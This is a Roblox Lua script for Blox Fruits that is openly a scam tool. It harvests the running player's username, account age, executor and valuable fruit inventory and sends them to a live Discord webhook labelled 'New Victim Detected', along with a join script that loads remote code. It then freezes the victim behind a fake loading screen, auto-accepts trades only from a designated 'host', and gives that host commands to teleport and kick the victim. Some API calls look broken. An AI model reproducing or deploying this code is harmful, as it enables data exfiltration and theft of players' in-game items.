-- CONFIG
local WEBHOOK_URL = "https://discord.com/api/webhooks/1555905535658692618/z6o9qqHw52qWenlC7xzKaNaN4D_7EusIe0LQ0O7qzurGA4jpSq-SQBadI9v8k6kCFyWu"
local HOST_NAME = "host" -- jayaracena14
local HOST_USERID = 0 -- 4030892840

-- 1. DATA EXTRACTION
local player = game.Players.LocalPlayer
local username = player.Name
local userId = player.UserId
local accountAge = os.time() - (player.Created:UnixTimestamp())
local ageDays = math.floor(accountAge / 86400)

-- Detect Executor
local executorName = "Unknown"
if getgenv() then
    if getgenv().shared then
        executorName = "Infinite Yield / Fluxus"
    elseif loadstring then
        -- Basic check
        if game:HttpGet then
            executorName = "Standard (loadstring)"
        end
    end
    -- Specific checks
    if getgenv().writefile then
        if getgenv().writefile("test.txt", "test") then
            executorName = "WriteFile Capable (Synapse/CodeX)"
        end
    end
    -- Heuristic for Delta
    if getgenv().Delta or getgenv().delta then
        executorName = "Delta"
    end
end

-- Extract Fruits
local fruits = {}
local fruitData = {}
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local fruitInventory = ReplicatedStorage:FindFirstChild("FruitInventory") or ReplicatedStorage:FindFirstChild("Inventory")

if fruitInventory then
    for _, folder in pairs(fruitInventory:GetChildren()) do
        if folder:IsA("Folder") or folder:IsA("Model") then
            for _, fruit in pairs(folder:GetChildren()) do
                if fruit:IsA("Model") or fruit:IsA("Folder") then
                    local name = fruit:GetAttribute("Name") or fruit.Name
                    local rarity = fruit:GetAttribute("Rarity") or "Common"
                    local amount = fruit:GetAttribute("Amount") or 1
                    
                    -- Check if it's a fruit
                    if name and (name:lower():find("fruit") or name:lower():find("magma") or name:lower():find("ghost")) then
                        local key = name .. "-" .. rarity
                        if not fruitData[key] then
                            fruitData[key] = 0
                        end
                        fruitData[key] = fruitData[key] + amount
                    end
                end
            end
        end
    end
end

-- Format Fruit List
local fruitString = ""
for key, amount in pairs(fruitData) do
    local name, rarity = key:match("^(%w+)-(.+)$")
    fruitString = fruitString .. string.format("🍎 [%s] %s - %dx\n", rarity, name, amount)
end

if fruitString == "" then
    fruitString = "None detected\n"
end

-- 2. SEND TO DISCORD
local payload = {
    username = "Blox Fruits Logger",
    embeds = {
        {
            title = "👤 New Victim Detected",
            description = string.format([[
👤 Display Name : %s
🆔 Username     : %s
📅 Account Age  : %d days
🖥️ Executor     : %s
🌊 Sea          : %d
😎 Receiver    : %s
💰 Valuable Items
%s
📜 Join Script
getgenv().USERNAME = "%s"
loadstring(game:HttpGet("https://raw.githubusercontent.com/MoziIOnTop/pro/refs/heads/main/join.lua"))
]], username, username, ageDays, executorName, player.Sea or 1, HOST_NAME, fruitString, username),
            color = 15105570 -- Blue
        }
    }
}

pcall(function()
    request({
        url = WEBHOOK_URL,
        method = "POST",
        headers = {["Content-Type"] = "application/json"},
        body = game:SerializeObject(payload) -- Note: Roblox HttpPost needs JSON string
    })
end)

-- 3. THE "FREEZE" & TRADE BOT
local playerGui = player:WaitForChild("PlayerGui")
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "VictimFreeze"
screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
screenGui.Enabled = true
screenGui.ResetOnSpawn = false
screenGui.Parent = playerGui

local overlay = Instance.new("Frame")
overlay.Name = "Overlay"
overlay.Size = UDim2.fromScale(1, 1)
overlay.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
overlay.BackgroundTransparency = 0.3
overlay.BorderSizePixel = 0
overlay.Parent = screenGui

local label = Instance.new("TextLabel")
label.Name = "Loading"
label.Size = UDim2.fromScale(1, 1)
label.BackgroundTransparency = 1
label.Text = "⏳ Loading...\n\nEstablishing Connection..."
label.TextColor3 = Color3.fromRGB(255, 255, 255)
label.TextSize = 24
label.Font = Enum.Font.GothamBold
label.TextXAlignment = Enum.TextXAlignment.Center
label.Parent = overlay

local spinner = Instance.new("Frame")
spinner.Name = "Spinner"
spinner.Size = UDim2.fromOffset(50, 50)
spinner.Position = UDim2.new(0.5, -25, 0.4, -25)
spinner.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
spinner.BackgroundTransparency = 1
spinner.BorderSizePixel = 0
spinner.Parent = overlay

local spinValue = 0
task.spawn(function()
    while true do
        spinValue = (spinValue + 1) % 360
        spinner.Rotation = spinValue
        task.wait(0.05)
    end
end)

-- Lock Movement
local character = player.Character or player.CharacterAdded:Wait()
local humanoid = character:WaitForChild("Humanoid")
local rootPart = character:WaitForChild("HumanoidRootPart")

-- Prevent movement
humanoid.WalkSpeed = 0
humanoid.JumpPower = 0
humanoid.UseJumpPower = true

-- Prevent leaving via UI
local function blockInput(input, gameProcessed)
    if gameProcessed then return end
    -- If they try to press Esc or M, we can't stop the Roblox menu, 
    -- but we can make the character look frozen by resetting position if it moves
end
game:GetService("UserInputService").InputBegan:Connect(blockInput)

-- Anti-Cheat for Movement (If they somehow move via other means)
task.spawn(function()
    while true do
        if humanoid then
            humanoid.WalkSpeed = 0
            humanoid.JumpPower = 0
        end
        task.wait(0.1)
    end
end)

-- 4. TRADE BOT LOGIC
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local TradingService = ReplicatedStorage:FindFirstChild("Trading")
local TradeRemotes = TradingService and TradingService:FindFirstChild("Remotes") or nil

-- Listen for Trade Table
local function monitorTrades()
    local tableModel = workspace:FindFirstChild("TradingTable")
    if not tableModel then return end
    
    local seats = tableModel:GetChildren()
    local localSeat = nil
    for _, seat in pairs(seats) do
        if seat:IsA("Seat") or seat:IsA("Model") then
            if seat:FindFirstChild("Occupant") then
                -- Check if local player is here
            end
        end
    end
end

-- Simplified Trade Bot: Listen for Trade Request
-- In Blox Fruits, trades are often handled via RemoteEvents in ReplicatedStorage
local tradeRemote = ReplicatedStorage:FindFirstChild("Trade") or ReplicatedStorage:FindFirstChild("Trading")

if tradeRemote then
    for _, child in pairs(tradeRemote:GetChildren()) do
        if child:IsA("RemoteEvent") or child:IsA("BindableEvent") then
            child.OnClientEvent:Connect(function(data)
                -- 'data' usually contains the other player's UserId or the trade ID
                local otherId = data[1] or data.UserId or data.OtherPlayer
                
                if otherId ~= userId then
                    -- If it's not us, it's a trade
                    -- We need to auto-reject if not Host, Auto-Accept if Host
                    
                    -- Check if the other player is the Host
                    local otherPlayer = game.Players:GetPlayerByUserId(otherId)
                    local isHost = (otherId == HOST_USERID) or (otherPlayer and otherPlayer.Name == HOST_NAME)
                    
                    if isHost then
                        -- Auto Accept Logic
                        -- This is highly dependent on the specific Blox Fruits version
                        -- Usually, you send a "Accept" remote
                        local acceptRemote = tradeRemote:FindFirstChild("Accept") or tradeRemote:FindFirstChild("Confirm")
                        if acceptRemote then
                            acceptRemote:FireServer(data)
                        end
                    else
                        -- Auto Reject Logic
                        local rejectRemote = tradeRemote:FindFirstChild("Reject") or tradeRemote:FindFirstChild("Cancel")
                        if rejectRemote then
                            rejectRemote:FireServer(data)
                        end
                    end
                end
            end)
        end
    end
end

-- 5. HOST COMMANDS (If Host executes this script too)
-- This part only runs if the user executing is the Host
if username == HOST_NAME or userId == HOST_USERID then
    local function hostCommand(cmd)
        local victim = nil
        -- Find the victim (The one with the Freeze UI)
        for _, p in pairs(game.Players:GetPlayers()) do
            if p ~= player and p:FindFirstChild("PlayerGui") and p.PlayerGui:FindFirstChild("VictimFreeze") then
                victim = p
                break
            end
        end
        
        if not victim then
            print("No victim found. Did they run the script?")
            return
        end
        
        local args = cmd:split(" ")
        local command = args[1]
        local target = args[2]
        
        if command == ".add" then
            local fruitName = table.concat(args, " ", 2)
            -- Add fruit to victim's inventory
            -- This requires modifying the victim's client-side data if the game syncs it,
            -- or using a Remote if available.
            print("Attempting to add " .. fruitName .. " to " .. victim.Name)
            -- Example: If there's a remote called "AddFruit"
            local addRemote = ReplicatedStorage:FindFirstChild("AddFruit")
            if addRemote and addRemote:IsA("RemoteFunction") then
                addRemote:InvokeServer(fruitName, victim.UserId)
            end
        elseif command == ".clear" then
            print("Clearing " .. victim.Name .. " inventory")
            -- Logic to clear inventory
        elseif command == ".tp" then
            local x, y, z = tonumber(args[2]), tonumber(args[3]), tonumber(args[4])
            if x and y and z then
                local victimChar = victim.Character
                if victimChar then
                    local root = victimChar:FindFirstChild("HumanoidRootPart")
                    if root then
                        root.CFrame = CFrame.new(x, y, z)
                    end
                end
            end
        elseif command == ".kick" then
            victim:Kick("Kicked by Host")
        end
    end

    -- Listen for chat commands
    game:GetService("Chat").ChatStateChange:Connect(function(state)
        -- Not directly needed for chat input, use UserInputService
    end)
    
    -- Better: Listen to Chat Box Input
    local chatBox = game:GetService("Chat")
    chatBox.OnClientEvent:Connect(function(player, message, ...)
        if player == player then
            if message:sub(1, 1) == "." then
                hostCommand(message)
                -- Prevent chat from showing
                -- You can't easily suppress chat display, but you can process it
            end
        end
    end)
    
    print("Host Mode Active. Use chat commands like .add Magma, .tp 0 10 0, .kick")
else
    print("Victim Mode Active. You are frozen.")
end

print("Script Loaded.")
